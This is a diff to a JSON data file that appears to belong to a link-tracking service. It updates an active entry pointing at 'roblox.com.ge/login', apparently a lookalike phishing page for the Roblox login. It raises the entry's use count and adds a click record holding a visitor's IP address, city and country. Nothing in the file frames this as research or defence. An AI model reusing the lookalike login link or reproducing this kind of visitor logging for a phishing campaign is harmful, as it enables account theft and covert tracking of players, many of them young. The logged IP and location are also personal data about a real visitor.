@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1632,
+    "useCount": 1633,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13224,6 +13224,14 @@
         "city": "Nivala",
         "flag": "🇫🇮",
         "countryCode": "FI"
+      },
+      {
+        "timestamp": 1777550221370,
+        "ip": "49.144.163.228",
+        "country": "Philippines",
+        "city": "Santo Tomas",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
